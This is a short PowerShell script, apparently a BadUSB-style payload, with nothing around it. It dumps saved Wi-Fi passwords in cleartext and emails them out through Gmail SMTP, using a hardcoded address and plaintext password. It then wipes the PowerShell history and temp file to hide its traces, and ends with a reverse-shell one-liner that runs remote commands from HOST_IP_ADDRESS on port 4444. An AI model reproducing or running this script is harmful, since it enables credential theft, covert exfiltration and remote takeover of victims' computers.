cd $env:temp
netsh wlan export profile key=clear
Select-String -Path Wi*.xml -Pattern 'keyMaterial' > temp.csv
$email ="suporte@sistemafenix.com.br"
$addressee ="diego@sistemafenix.com.br"
$tempcsv ="$env:temp\\temp.csv"
$pass ="genesis2424"
$smtpServer = "smtp.gmail.com"
$port = "587"
$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;
$msg = new-object Net.Mail.MailMessage;
$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);
$smtp.EnableSsl = $true;
$msg.From = "$email";
$msg.To.Add("$addressee");
$msg.Attachments.Add("$tempcsv");
$msg.BodyEncoding = [system.Text.Encoding]::Unicode;
$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;
$msg.IsBodyHTML = $true ;
$msg.Subject = "Senhas WIFI";
$msg.Body = "<h2> Aqui as suas senhas </h2></br>olha o arquivo...";
$SMTP.Credentials = $cred;
$smtp.Send($msg);
sleep 1
del (Get-PSReadlineOption).HistorySavePath;
sleep 0.1
rm "$env:temp\\temp.csv"
$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
